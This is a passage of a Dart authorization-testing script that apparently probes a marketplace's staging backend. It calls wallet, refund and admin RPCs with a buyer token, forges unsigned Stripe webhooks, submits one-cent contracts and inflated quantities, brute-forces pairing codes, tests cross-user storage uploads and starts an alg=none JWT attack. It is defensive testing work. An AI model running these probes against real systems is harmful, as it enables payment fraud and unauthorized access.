        'p_stripe_transfer_id': 'tr_fake',
      },
      buyerJwt,
      'P0'
    ),
    (
      'C-RPC-ENSURE-OTHER',
      'batata_ensure_wallet',
      {'p_user_id': sellerId},
      buyerJwt,
      'P3'
    ),
    (
      'C-RPC-RELEASE',
      'batata_release_seller_wallet_for_order',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
      buyerJwt,
      'P1'
    ),
    (
      'C-RPC-REFUND-WALLET',
      'batata_refund_buyer_wallet_for_order',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
      buyerJwt,
      'P1'
    ),
    (
      'C-RPC-PARTIAL-DISPUTE',
      'batata_process_partial_refund_dispute',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
      buyerJwt,
      'P1'
    ),
    (
      'C-RPC-ADMIN-LIST',
      'batata_admin_list_profiles',
      {},
      buyerJwt,
      'P1'
    ),
    (
      'C-RPC-IS-ADMIN',
      'batata_is_admin',
      {},
      buyerJwt,
      'P3'
    ),
    (
      'C-RPC-FIND-EMAIL',
      'batata_find_user_id_by_email',
      {'p_email': envPeekSellerEmail()},
      buyerJwt,
      'P2'
    ),
    (
      'C-RPC-PAYOUT-DETAILS',
      'batata_seller_direct_payment_details',
      {'p_seller_id': sellerId},
      buyerJwt,
      'P1'
    ),
    (
      'C-RPC-GET-MY-PAYOUT-SKIP',
      'batata_get_my_payout_details',
      {},
      buyerJwt,
      'P3'
    ),
    (
      'C-RPC-PRIZE-ORDER',
      'batata_create_raffle_prize_order',
      {'p_raffle_id': '00000000-0000-0000-0000-000000000001'},
      buyerJwt,
      'P0'
    ),
    (
      'C-RPC-DRAW',
      'batata_draw_live_raffle_winners',
      {'p_raffle_id': '00000000-0000-0000-0000-000000000001'},
      buyerJwt,
      'P1'
    ),
    (
      'C-RPC-CREATE-RAFFLE',
      'batata_create_live_raffle',
      {
        'p_live_id': '00000000-0000-0000-0000-000000000001',
        'p_title': 'cego',
        'p_winner_count': 1,
        'p_activate': true,
        'p_show_public_leaderboard': true,
      },
      buyerJwt,
      'P1'
    ),
    (
      'C-RPC-SETTLE-TIP',
      'batata_settle_live_tip_from_stripe',
      {
        'p_tip_id': '00000000-0000-0000-0000-000000000001',
        'p_stripe_session_id': 'cs_test_fake',
        'p_paid_amount_cents': 10000,
      },
      buyerJwt,
      'P0'
    ),
    (
      'C-RPC-CONVERT',
      'batata_live_reservation_stripe_convert',
      {
        'p_request_id': '00000000-0000-0000-0000-000000000001',
        'p_order_id': '00000000-0000-0000-0000-000000000001',
      },
      buyerJwt,
      'P1'
    ),
    (
      'C-RPC-MARK-SOLD',
      'batata_mark_live_item_sold',
      {'p_live_item_id': '00000000-0000-0000-0000-000000000001'},
      buyerJwt,
      'P1'
    ),
    (
      'C-RPC-NUKE',
      'staging_nuke_user_data',
      {'p_user_id': sellerId},
      buyerJwt,
      'P0'
    ),
    (
      'C-RPC-KILL',
      'batata_director_activate_kill_switch',
      {},
      buyerJwt,
      'P2'
    ),
    (
      'C-RPC-AUTO-FB',
      'batata_generate_auto_feedback',
      {},
      buyerJwt,
      'P2'
    ),
    (
      'C-RPC-CLAIM-EXT',
      'batata_claim_external_reservations',
      {},
      buyerJwt,
      'P2'
    ),
    (
      'C-RPC-SQL-SVC-NAME',
      'exec_sql',
      {'sql': 'select 1'},
      buyerJwt,
      'P0'
    ),
  ];

  for (final t in moneyRpcs) {
    if (known.isNotEmpty &&
        !known.contains(t.$2) &&
        t.$2 != 'exec_sql' &&
        t.$2 != 'staging_nuke_user_data') {
      // still try — OpenAPI may miss overloads
    }
    await call(
      id: t.$1,
      fn: t.$2,
      params: t.$3,
      jwt: t.$4,
      who: 'buyer',
      sevIfSuccess: t.$5,
    );
  }

  // Real order IDs for wallet release/refund
  final paidOrders = await svcSelect(
    'orders',
    select: 'id,status,buyer_id,seller_id,price_total',
    filter: 'status=eq.pago&seller_id=eq.$sellerId',
    limit: 5,
  );
  if (paidOrders.isNotEmpty) {
    final oid = paidOrders.first['id'];
    final rel = await rpcRaw(
      'batata_release_seller_wallet_for_order',
      {'p_order_id': oid},
      jwt: buyerJwt,
    );
    pass(
      'C-RPC-RELEASE-REAL',
      'release wallet order paga como buyer',
      'order=$oid HTTP ${rel.statusCode} ${clip(rel.body, 220)}',
    );
    final ref = await rpcRaw(
      'batata_refund_buyer_wallet_for_order',
      {'p_order_id': oid},
      jwt: buyerJwt,
    );
    // If this credits buyer from a paid order without being seller — P0
    final low = ref.body.toLowerCase();
    final denied = ref.statusCode >= 400 ||
        low.contains('false') ||
        low.contains('ok":false') ||
        low.contains('permission') ||
        low.contains('42501');
    if (ref.statusCode < 300 && ref.body == 'true') {
      addResult(
        id: 'C-RPC-REFUND-REAL',
        severity: 'P0',
        title: 'Buyer invoca refund wallet de order paga',
        verdict: 'FAIL',
        pre: 'order paga $oid',
        exploit: 'batata_refund_buyer_wallet_for_order',
        proof: 'HTTP ${ref.statusCode} ${clip(ref.body)}',
        impact: 'crédito wallet sem autoridade',
        boundary: 'RPC SECURITY DEFINER',
      );
    } else {
      pass(
        'C-RPC-REFUND-REAL',
        'refund wallet order paga como buyer',
        'HTTP ${ref.statusCode} denied=$denied ${clip(ref.body, 220)}',
      );
    }
  }

  // Tip pending with extreme amounts
  final lives = await svcSelect(
    'lives',
    select: 'id,seller_id,status',
    filter: 'seller_id=eq.$sellerId',
    limit: 3,
  );
  final liveId = lives.isEmpty ? null : lives.first['id'];
  if (liveId != null) {
    for (final amt in [-1.0, 0.0, 0.01, 1.0, 99999.0]) {
      final r = await rpcRaw(
        'batata_create_live_tip_pending',
        {
          'p_live_id': liveId,
          'p_seller_id': sellerId,
          'p_amount': amt,
          'p_message': 'cego',
        },
        jwt: buyerJwt,
      );
      pass(
        'C-RPC-TIP-$amt',
        'create tip pending amount=$amt',
        'HTTP ${r.statusCode} ${clip(r.body, 180)}',
      );
    }
  }

  // Admin resolve
  await call(
    id: 'C-RPC-ADMIN-RESOLVE',
    fn: 'batata_admin_resolve_dispute',
    params: {
      'p_dispute_id': '00000000-0000-0000-0000-000000000001',
      'p_action': 'refund',
    },
    jwt: buyerJwt,
    who: 'buyer',
    sevIfSuccess: 'P0',
  );
}

String envPeekSellerEmail() {
  try {
    final env = loadLiveOpsStagingEnv();
    return env['LIVE_OPS_TEST_SELLER_EMAIL'] ?? 'x@y.pt';
  } catch (_) {
    return 'x@y.pt';
  }
}

Future<void> probeEdges() async {
  coverage.add('Edge Functions: payment, refund, connect, webhook, e2e, mux, ocr, sms, nuke');

  // Stripe webhook without signature
  final wh = await http.post(
    Uri.parse('$base/functions/v1/stripe-webhook'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $anon',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({
      'type': 'checkout.session.completed',
      'data': {
        'object': {'id': 'cs_test_x', 'payment_status': 'paid'}
      }
    }),
  );
  if (wh.statusCode == 200) {
    addResult(
      id: 'C-EDGE-WH-NOSIG',
      severity: 'P0',
      title: 'stripe-webhook aceita pedido sem assinatura',
      verdict: 'FAIL',
      pre: 'anon',
      exploit: 'POST stripe-webhook sem stripe-signature',
      proof: 'HTTP ${wh.statusCode} ${clip(wh.body, 300)}',
      impact: 'settle falso / forjar pagamento',
      boundary: 'Edge stripe-webhook',
    );
  } else {
    pass(
      'C-EDGE-WH-NOSIG',
      'webhook sem assinatura',
      'HTTP ${wh.statusCode} ${clip(wh.body, 180)}',
    );
  }

  // fase2 settle with user jwt
  final e2e = await http.post(
    Uri.parse('$base/functions/v1/create-payment-intent?fase2_e2e_settle=1'),
    headers: hUser(buyerJwt),
    body: jsonEncode({
      'order_id': '00000000-0000-0000-0000-000000000001',
      'payment_intent_id': 'pi_fake',
    }),
  );
  final e2eOk = e2e.statusCode == 200 && e2e.body.contains('"ok":true');
  if (e2eOk) {
    addResult(
      id: 'C-EDGE-E2E-SETTLE',
      severity: 'P0',
      title: 'fase2_e2e_settle com JWT de utilizador',
      verdict: 'FAIL',
      pre: 'JWT buyer',
      exploit: 'POST create-payment-intent?fase2_e2e_settle=1',
      proof: 'HTTP ${e2e.statusCode} ${clip(e2e.body, 300)}',
      impact: 'settle de pagamento sem service_role',
      boundary: 'Edge create-payment-intent',
    );
  } else {
    pass(
      'C-EDGE-E2E-SETTLE',
      'fase2_e2e_settle JWT user',
      'HTTP ${e2e.statusCode} ${clip(e2e.body, 180)}',
    );
  }

  final oversell = await edge(
    'sec-fase2-e2e-oversell',
    jwt: buyerJwt,
    body: {'buyer_id': buyerId, 'seller_id': sellerId, 'probe': '1'},
  );
  pass(
    'C-EDGE-OVERSELL',
    'sec-fase2-e2e-oversell JWT user',
    'HTTP ${oversell.statusCode} ${clip(oversell.body, 180)}',
  );

  // refund as buyer
  final refund = await edge(
    'refund-order',
    jwt: buyerJwt,
    body: {'order_id': '00000000-0000-0000-0000-000000000001'},
  );
  pass(
    'C-EDGE-REFUND-BUYER',
    'refund-order como buyer',
    'HTTP ${refund.statusCode} ${clip(refund.body, 180)}',
  );

  // connect as other user
  final conn = await edge(
    'create-connect-account',
    jwt: buyerJwt,
    body: {'user_id': sellerId, 'amount': 100, 'idempotency_key': 'cego_c_wd_1'},
  );
  pass(
    'C-EDGE-CONNECT-OTHER',
    'create-connect-account user_id=seller',
    'HTTP ${conn.statusCode} ${clip(conn.body, 200)}',
  );

  // payout amount > balance as seller
  final payHuge = await edge(
    'create-connect-account',
    jwt: sellerJwt,
    body: {
      'user_id': sellerId,
      'amount': 99999999,
      'idempotency_key': 'cego_c_huge_${Random().nextInt(1 << 20)}',
    },
  );
  pass(
    'C-EDGE-PAYOUT-HUGE',
    'payout 99999999 cêntimos',
    'HTTP ${payHuge.statusCode} ${clip(payHuge.body, 220)}',
  );

  // payment intent without order
  final piNo = await edge(
    'create-payment-intent',
    jwt: buyerJwt,
    body: {
      'buyer_id': buyerId,
      'amount': 50,
      'currency': 'eur',
      'shipping_method': 'hand',
    },
  );
  pass(
    'C-EDGE-PI-NO-ORDER',
    'payment-intent sem order_id',
    'HTTP ${piNo.statusCode} ${clip(piNo.body, 180)}',
  );

  // payment intent amount mismatch / prize flag
  final holdOrders = await svcSelect(
    'orders',
    select: 'id,status,buyer_id,product_id,seller_id,price_total,contract_unit_cents',
    filter: 'buyer_id=eq.$buyerId&status=eq.reserva_pendente',
    limit: 5,
  );
  var orderForPi = holdOrders.isEmpty ? null : holdOrders.first;
  if (orderForPi == null) {
    final any = await svcSelect(
      'orders',
      select:
          'id,status,buyer_id,product_id,seller_id,price_total,contract_unit_cents',
      filter: 'buyer_id=eq.$buyerId',
      limit: 20,
    );
    for (final o in any) {
      final st = '${o['status']}'.toLowerCase();
      if (const {
        'reserva_pendente',
        'reservado',
        'aguarda_pagamento',
        'aguarda_confirmacao',
        'premio_rifa',
      }.contains(st)) {
        orderForPi = o;
        break;
      }
    }
  }

  if (orderForPi != null) {
    final oid = orderForPi['id'];
    final piLow = await edge(
      'create-payment-intent',
      jwt: buyerJwt,
      body: {
        'buyer_id': buyerId,
        'order_id': oid,
        'amount': 50,
        'currency': 'eur',
        'shipping_method': 'hand',
        'prize_shipping': false,
        'item_price': 0.01,
        'product_id': orderForPi['product_id'],
      },
    );
    var serverAmt = -1;
    try {
      final d = jsonDecode(piLow.body);
      if (d is Map) serverAmt = int.tryParse('${d['server_amount_cents']}') ?? -1;
    } catch (_) {}
    pass(
      'C-EDGE-PI-AMOUNT',
      'payment-intent amount=50c body vs quote',
      'HTTP ${piLow.statusCode} server_amount_cents=$serverAmt ${clip(piLow.body, 260)}',
    );

    final piPrize = await edge(
      'create-payment-intent',
      jwt: buyerJwt,
      body: {
        'buyer_id': buyerId,
        'order_id': oid,
        'amount': 350,
        'currency': 'eur',
        'shipping_method': 'carrier',
        'prize_shipping': true,
      },
    );
    pass(
      'C-EDGE-PI-PRIZE-FLAG',
      'prize_shipping=true em order normal',
      'HTTP ${piPrize.statusCode} ${clip(piPrize.body, 220)}',
    );

    // inject live_id / reservation
    final resv = await svcSelect(
      'live_reservation_requests',
      select: 'id,live_id,live_item_id,buyer_id,status',
      filter: 'status=eq.accepted',
      limit: 5,
    );
    if (resv.isNotEmpty) {
      final r = resv.first;
      final piInj = await edge(
        'create-payment-intent',
        jwt: buyerJwt,
        body: {
          'buyer_id': buyerId,
          'order_id': oid,
          'amount': 50,
          'currency': 'eur',
          'shipping_method': 'hand',
          'live_id': r['live_id'],
          'live_item_id': r['live_item_id'],
          'reservation_request_id': r['id'],
        },
      );
      var injAmt = -1;
      try {
        final d = jsonDecode(piInj.body);
        if (d is Map) injAmt = int.tryParse('${d['server_amount_cents']}') ?? -1;
      } catch (_) {}
      chains.add({
        'id': 'CHAIN-LIVEID-INJECT',
        'a': 'order marketplace $oid',
        'b': 'create-payment-intent live_id+reservation_request_id alheios',
        'c': 'session metadata / quote',
        'http': piInj.statusCode,
        'body': clip(piInj.body, 400),
        'server_amount_cents': injAmt,
      });
      // If checkout was created, metadata may still carry live_id even if quote ignored it.
      pass(
        'C-EDGE-PI-LIVE-INJECT',
        'inject live_id+reservation na PI de order própria',
        'HTTP ${piInj.statusCode} amt=$injAmt ${clip(piInj.body, 240)}',
      );
    }

    // other user's order
    final otherOrd = await svcSelect(
      'orders',
      select: 'id,buyer_id,status',
      filter: 'buyer_id=eq.$sellerId',
      limit: 3,
    );
    if (otherOrd.isNotEmpty) {
      final piX = await edge(
        'create-payment-intent',
        jwt: buyerJwt,
        body: {
          'buyer_id': buyerId,
          'order_id': otherOrd.first['id'],
          'amount': 500,
          'currency': 'eur',
          'shipping_method': 'hand',
        },
      );
      pass(
        'C-EDGE-PI-OTHER-ORDER',
        'PI order do seller como buyer',
        'HTTP ${piX.statusCode} ${clip(piX.body, 200)}',
      );
    }
  } else {
    gaps.add('sem order checkoutable do buyer para PI tests');
  }

  // PI as anon
  final piAnon = await edge(
    'create-payment-intent',
    jwt: buyerJwt,
    asAnon: true,
    body: {
      'buyer_id': buyerId,
      'order_id': '00000000-0000-0000-0000-000000000001',
      'amount': 500,
      'shipping_method': 'hand',
    },
  );
  pass(
    'C-EDGE-PI-ANON',
    'payment-intent anon',
    'HTTP ${piAnon.statusCode} ${clip(piAnon.body, 160)}',
  );

  // GET settle unauthenticated garbage session
  final getSettle = await http.get(
    Uri.parse(
      '$base/functions/v1/create-payment-intent?checkout_return=success&session_id=cs_test_naoexiste',
    ),
    headers: {'apikey': anon, 'Authorization': 'Bearer $anon'},
  );
  pass(
    'C-EDGE-PI-GET-FAKE',
    'GET settle session fake',
    'HTTP ${getSettle.statusCode} ${clip(getSettle.body, 180)}',
  );

  // tip checkout tip_id client
  final tip = await edge(
    'create-live-tip-checkout',
    jwt: buyerJwt,
    body: {
      'seller_id': sellerId,
      'amount_eur': 1,
      'tip_id': '00000000-0000-0000-0000-000000000001',
    },
  );
  pass(
    'C-EDGE-TIP-CLIENT-ID',
    'tip checkout com tip_id cliente',
    'HTTP ${tip.statusCode} ${clip(tip.body, 180)}',
  );

  final tipHi = await edge(
    'create-live-tip-checkout',
    jwt: buyerJwt,
    body: {'seller_id': sellerId, 'amount_eur': 999999},
  );
  pass(
    'C-EDGE-TIP-CAP',
    'tip 999999 EUR',
    'HTTP ${tipHi.statusCode} ${clip(tipHi.body, 180)}',
  );

  // ingest OCR no token
  final ocr = await edge(
    'ingest-ocr-reservation',
    jwt: buyerJwt,
    body: {
      'live_id': '00000000-0000-0000-0000-000000000001',
      'ocr_line_hash': 'abcdefgh',
      'detected_at': DateTime.now().toUtc().toIso8601String(),
      'ref_number': 1,
    },
  );
  pass(
    'C-EDGE-OCR-NOTOKEN',
    'ingest-ocr sem device token (header default)',
    'HTTP ${ocr.statusCode} ${clip(ocr.body, 180)}',
  );
  final ocr2 = await http.post(
    Uri.parse('$base/functions/v1/ingest-ocr-reservation'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $anon',
      'Content-Type': 'application/json',
      'x-device-token': '00000000-0000-0000-0000-000000000001',
    },
    body: jsonEncode({
      'live_id': '00000000-0000-0000-0000-000000000001',
      'ocr_line_hash': 'abcdefghijkl',
      'detected_at': DateTime.now().toUtc().toIso8601String(),
      'ref_number': 1,
    }),
  );
  pass(
    'C-EDGE-OCR-FAKE-TOKEN',
    'ingest-ocr token UUID fake',
    'HTTP ${ocr2.statusCode} ${clip(ocr2.body, 180)}',
  );

  // ps pairing brute a few codes (unauthenticated)
  var claimed = false;
  for (final code in ['000000', '123456', '111111', '999999']) {
    final ps = await http.post(
      Uri.parse('$base/functions/v1/ps-pairing-claim'),
      headers: {
        'apikey': anon,
        'Content-Type': 'application/json',
      },
      body: jsonEncode({'code': code, 'device_id': 'cego-c'}),
    );
    if (ps.statusCode == 200 && ps.body.contains('"ok":true')) {
      claimed = true;
      addResult(
        id: 'C-EDGE-PS-CLAIM',
        severity: 'P1',
        title: 'ps-pairing-claim código trivial sem auth',
        verdict: 'FAIL',
        pre: 'anon',
        exploit: 'POST ps-pairing-claim code=$code',
        proof: clip(ps.body, 400),
        impact: 'pairing de leitor PS / token de ingest',
        boundary: 'Edge ps-pairing-claim',
      );
      break;
    }
  }
  if (!claimed) {
    pass(
      'C-EDGE-PS-CLAIM',
      'ps-pairing-claim códigos triviais',
      'nenhum código trivial reivindicado',
    );
  }

  // nuke (should refuse allowlist / not delete)
  final nuke = await edge(
    'delete-test-account',
    jwt: buyerJwt,
    body: {'confirm': 'APAGAR TUDO'},
  );
  pass(
    'C-EDGE-NUKE',
    'delete-test-account',
    'HTTP ${nuke.statusCode} ${clip(nuke.body, 200)}',
  );

  // mux live as buyer (may create a live — try not to leave active)
  final mux = await edge(
    'create-mux-live',
    jwt: buyerJwt,
    body: {'title': 'CEGO-C-PROBE-DO-NOT-USE'},
  );
  pass(
    'C-EDGE-MUX-BUYER',
    'create-mux-live como buyer',
    'HTTP ${mux.statusCode} ${clip(mux.body, 220)}',
  );
  // if created, try complete immediately via complete-mux-live if we got an id
  try {
    final d = jsonDecode(mux.body);
    if (d is Map && d['live_id'] != null) {
      await edge(
        'complete-mux-live',
        jwt: buyerJwt,
        body: {'live_id': d['live_id']},
      );
    }
  } catch (_) {}

  // send-sms-bulkgate
  final sms = await edge(
    'send-sms-bulkgate',
    jwt: buyerJwt,
    asAnon: true,
    body: {'phone': '+351910000000', 'text': 'x'},
  );
  pass(
    'C-EDGE-SMS',
    'send-sms-bulkgate anon',
    'HTTP ${sms.statusCode} ${clip(sms.body, 180)}',
  );

  // livekit publish
  final lk = await edge(
    'livekit-mux-publish',
    jwt: buyerJwt,
    body: {'step': 'token', 'live_id': '00000000-0000-0000-0000-000000000001'},
  );
  pass(
    'C-EDGE-LIVEKIT',
    'livekit-mux-publish token live alheia',
    'HTTP ${lk.statusCode} ${clip(lk.body, 180)}',
  );
}

Future<void> probeStorage() async {
  coverage.add('Storage buckets + object ACL');
  final buckets = await http.get(
    Uri.parse('$base/storage/v1/bucket'),
    headers: hUser(buyerJwt),
  );
  pass(
    'C-STO-LIST',
    'list buckets',
    'HTTP ${buckets.statusCode} ${clip(buckets.body, 400)}',
  );
  List names = [];
  try {
    final d = jsonDecode(buckets.body);
    if (d is List) {
      names = [
        for (final e in d)
          if (e is Map) e['name'] ?? e['id']
      ];
    }
  } catch (_) {}

  for (final b in names.take(12)) {
    final list = await http.post(
      Uri.parse('$base/storage/v1/object/list/$b'),
      headers: hUser(buyerJwt),
      body: jsonEncode({'prefix': '', 'limit': 5}),
    );
    pass(
      'C-STO-LS-$b',
      'list objects $b',
      'HTTP ${list.statusCode} ${clip(list.body, 200)}',
    );
  }

  // upload to seller prefix
  final up = await http.post(
    Uri.parse(
      '$base/storage/v1/object/chat_media/chat_uploads/$sellerId/cego_c.txt',
    ),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerJwt',
      'Content-Type': 'text/plain',
      'x-upsert': 'true',
    },
    body: 'cego-c-probe',
  );
  if (up.statusCode < 300) {
    addResult(
      id: 'C-STO-CROSS-UPLOAD',
      severity: 'P2',
      title: 'Upload para prefixo do seller',
      verdict: 'FAIL',
      pre: 'JWT buyer',
      exploit: 'PUT chat_media/chat_uploads/$sellerId/cego_c.txt',
      proof: 'HTTP ${up.statusCode} ${clip(up.body, 200)}',
      impact: 'escrever objectos no prefixo de outro user',
      boundary: 'Storage RLS',
    );
  } else {
    pass(
      'C-STO-CROSS-UPLOAD',
      'upload prefixo seller',
      'HTTP ${up.statusCode} ${clip(up.body, 160)}',
    );
  }

  final ownUp = await http.post(
    Uri.parse(
      '$base/storage/v1/object/chat_media/chat_uploads/$buyerId/cego_c_own.txt',
    ),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerJwt',
      'Content-Type': 'text/plain',
      'x-upsert': 'true',
    },
    body: 'own',
  );
  pass(
    'C-STO-OWN-UPLOAD',
    'upload prefixo próprio',
    'HTTP ${ownUp.statusCode} ${clip(ownUp.body, 160)}',
  );
}

Future<void> probeCompositions() async {
  coverage.add('Composições A→B→C (contrato, checkout, rifa, convert, wallet)');
  final products = await svcSelect(
    'products',
    select: 'id,price,quantity,seller_id,title',
    filter: 'seller_id=eq.$sellerId&quantity=gte.1',
    limit: 5,
  );
  if (products.isEmpty) {
    gaps.add('sem produto com stock para composição checkout');
    return;
  }
  final p = products.first;
  final pid = p['id'];
  final price = p['price'];

  // A: INSERT with sealed cheap contract
  final ins = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerJwt),
    body: {
      'product_id': pid,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'price_total': 0.01,
      'status': 'reserva_pendente',
      'payment_method': 'Pagamento na App',
      'quantity': 1,
      'is_reservation': true,
      'contract_unit_cents': 1,
      'contract_qty': 1,
      'shipping_method': 'Entrega em mão (€0.00)',
    },
  );
  String oid = '';
  Map<String, dynamic>? inserted;
  if (ins.statusCode < 300) {
    try {
      final d = jsonDecode(ins.body);
      if (d is List && d.isNotEmpty) {
        inserted = Map<String, dynamic>.from(d[0] as Map);
        oid = '${inserted['id']}';
      }
    } catch (_) {}
  }
  Map<String, dynamic>? db;
  if (oid.isNotEmpty) {
    final rows = await svcSelect(
      'orders',
      select:
          'id,status,contract_unit_cents,contract_qty,price_total,quantity',
      filter: 'id=eq.$oid',
      limit: 1,
    );
    db = rows.isEmpty ? null : rows.first;
  }

  // B: checkout
  http.Response? pi;
  int? serverAmt;
  if (oid.isNotEmpty) {
    pi = await edge(
      'create-payment-intent',
      jwt: buyerJwt,
      body: {
        'buyer_id': buyerId,
        'order_id': oid,
        'amount': 50,
        'currency': 'eur',
        'shipping_method': 'hand',
        'product_id': pid,
      },
    );
    try {
      final d = jsonDecode(pi.body);
      if (d is Map) {
        serverAmt = int.tryParse('${d['server_amount_cents']}');
      }
    } catch (_) {}
  }

  final catalogCents = ((num.tryParse('$price') ?? 0) * 100).round();
  final cheap =
      serverAmt != null && serverAmt > 0 && catalogCents > 200 && serverAmt < catalogCents / 2;

  chains.add({
    'id': 'CHAIN-CONTRACT-CHECKOUT',
    'a': 'INSERT order contract_unit_cents=1',
    'b': 'create-payment-intent',
    'c': 'server_amount_cents vs catálogo',
    'insert_http': ins.statusCode,
    'db': db,
    'pi_http': pi?.statusCode,
    'server_amount_cents': serverAmt,
    'catalog_cents': catalogCents,
    'cheap': cheap,
  });

  if (cheap) {
    addResult(
      id: 'C-CHAIN-CHEAP-CONTRACT',
      severity: 'P0',
      title: 'Contrato de 1 cêntimo aceite no checkout Stripe',
      verdict: 'FAIL',
      pre: 'produto $pid catalog=${p['price']}',
      exploit:
          'INSERT contract_unit_cents=1 → create-payment-intent shipping=hand',
      proof:
          'insert=${ins.statusCode} db=$db pi=${pi?.statusCode} server_amount_cents=$serverAmt catalog_cents=$catalogCents body=${clip(pi?.body, 300)}',
      impact: 'pagar menos que o preço autoritativo do catálogo/contrato real',
      boundary: 'orders INSERT + create-payment-intent quote',
    );
  } else {
    pass(
      'C-CHAIN-CHEAP-CONTRACT',
      'INSERT contrato 1c + checkout',
      'insert=${ins.statusCode} db=$db amt=$serverAmt catalog=$catalogCents ${clip(pi?.body, 200)}',
    );
  }

  if (oid.isNotEmpty) {
    await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.$oid',
      headers: hSvc(),
      body: {'status': 'cancelado', 'is_reservation': false},
    );
  }

  // A: legit insert B: patch qty C: checkout
  final ins2 = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerJwt),
    body: {
      'product_id': pid,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'price_total': price,
      'status': 'reserva_pendente',
      'payment_method': 'Pagamento na App',
      'quantity': 1,
      'is_reservation': true,
    },
  );
  String oid2 = '';
  if (ins2.statusCode < 300) {
    try {
      final d = jsonDecode(ins2.body);
      if (d is List && d.isNotEmpty) oid2 = '${d[0]['id']}';
    } catch (_) {}
  }
  if (oid2.isNotEmpty) {
    final pq = await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.$oid2',
      headers: hUser(buyerJwt),
      body: {'quantity': 1, 'contract_qty': 99},
    );
    final pi2 = await edge(
      'create-payment-intent',
      jwt: buyerJwt,
      body: {
        'buyer_id': buyerId,
        'order_id': oid2,
        'amount': 50,
        'currency': 'eur',
        'shipping_method': 'hand',
        'quantity': 99,
      },
    );
    int? amt2;
    try {
      final d = jsonDecode(pi2.body);
      if (d is Map) amt2 = int.tryParse('${d['server_amount_cents']}');
    } catch (_) {}
    final after = await svcSelect(
      'orders',
      select: 'quantity,contract_qty,contract_unit_cents',
      filter: 'id=eq.$oid2',
      limit: 1,
    );
    chains.add({
      'id': 'CHAIN-QTY',
      'a': 'INSERT qty=1',
      'b': 'PATCH contract_qty=99',
      'c': 'checkout',
      'patch_http': pq.statusCode,
      'after': after,
      'server_amount_cents': amt2,
      'pi_http': pi2.statusCode,
    });
    final unit = ((num.tryParse('$price') ?? 0) * 100).round();
    final oversoldQty = amt2 != null &&
        after.isNotEmpty &&
        (after.first['contract_qty'] == 99) &&
        amt2 >= unit * 50;
    if (oversoldQty) {
      addResult(
        id: 'C-CHAIN-QTY99',
        severity: 'P1',
        title: 'Checkout usa contract_qty inflacionado pelo cliente',
        verdict: 'FAIL',
        pre: 'order $oid2',
        exploit: 'PATCH contract_qty=99 → PI',
        proof: 'after=$after amt=$amt2 unit=$unit ${clip(pi2.body, 240)}',
        impact: 'qty/stock/preço desalinhados com o pedido real',
        boundary: 'orders UPDATE + quote',
      );
    } else {
      pass(
        'C-CHAIN-QTY99',
        'PATCH contract_qty + checkout',
        'patch=${pq.statusCode} after=$after amt=$amt2 ${clip(pi2.body, 180)}',
      );
    }
    await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.$oid2',
      headers: hSvc(),
      body: {'status': 'cancelado', 'is_reservation': false},
    );
  }

  // Convert RPC on a real reservation as buyer (not matching order)
  final accepted = await svcSelect(
    'live_reservation_requests',
    select: 'id,buyer_id,live_id,live_item_id,status,seller_id',
    filter: 'status=eq.accepted',
    limit: 10,
  );
  final victim = accepted.where((e) => e['buyer_id'] != buyerId).toList();
  if (victim.isNotEmpty && oid2.isNotEmpty) {
    // oid2 already cancelled; create fresh
    final ins3 = await rest(
      'POST',
      '/rest/v1/orders',
      headers: hUser(buyerJwt),
      body: {
        'product_id': pid,
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'price_total': price,
        'status': 'reserva_pendente',
        'payment_method': 'Pagamento na App',
        'quantity': 1,
      },
    );
    String oid3 = '';
    if (ins3.statusCode < 300) {
      try {
        final d = jsonDecode(ins3.body);
        if (d is List && d.isNotEmpty) oid3 = '${d[0]['id']}';
      } catch (_) {}
    }
    if (oid3.isNotEmpty) {
      final conv = await rpcRaw(
        'batata_live_reservation_stripe_convert',
        {'p_request_id': victim.first['id'], 'p_order_id': oid3},
        jwt: buyerJwt,
      );
      chains.add({
        'id': 'CHAIN-CONVERT-FOREIGN',
        'a': 'order própria',
        'b': 'convert reservation de outro buyer',
        'c': 'estado reservation',
        'http': conv.statusCode,
        'body': clip(conv.body, 300),
      });
      final ok = conv.statusCode < 300 &&
          conv.body.contains('"ok":true');
      if (ok) {
        addResult(
          id: 'C-CHAIN-CONVERT-FOREIGN',
          severity: 'P1',
          title: 'Convert de reserva alheia via RPC',
          verdict: 'FAIL',
          pre: 'reservation ${victim.first['id']} de outro buyer',
          exploit: 'batata_live_reservation_stripe_convert',
          proof: clip(conv.body, 400),
          impact: 'consumir/converter reserva de terceiro',
          boundary: 'RPC convert',
        );
      } else {
        pass(
          'C-CHAIN-CONVERT-FOREIGN',
          'convert reserva alheia',
          'HTTP ${conv.statusCode} ${clip(conv.body, 200)}',
        );
      }
      await rest(
        'PATCH',
        '/rest/v1/orders?id=eq.$oid3',
        headers: hSvc(),
        body: {'status': 'cancelado'},
      );
    }
  } else {
    gaps.add('sem reservation accepted de outro buyer para convert chain');
  }

  // Prize order RPC with real raffle
  final raffles = await svcSelect(
    'live_raffles',
    select: 'id,status,live_id',
    limit: 5,
  );
  if (raffles.isNotEmpty) {
    final pr = await rpcRaw(
      'batata_create_raffle_prize_order',
      {'p_raffle_id': raffles.first['id']},
      jwt: buyerJwt,
    );
    chains.add({
      'id': 'CHAIN-PRIZE',
      'a': 'raffle existente',
      'b': 'create_raffle_prize_order como não-vencedor',
      'http': pr.statusCode,
      'body': clip(pr.body, 300),
    });
    pass(
      'C-CHAIN-PRIZE',
      'prize order sem ser vencedor',
      'HTTP ${pr.statusCode} ${clip(pr.body, 200)}',
    );
  }
}

Future<void> probeJwtConfusion() async {
  coverage.add('JWT alg=none / role claim confusion');
  final none = base64Url.encode(utf8.encode('{"alg":"none","typ":"JWT"}'))
          .replaceAll('=', '') +
      '.' +
      base64Url
          .encode(
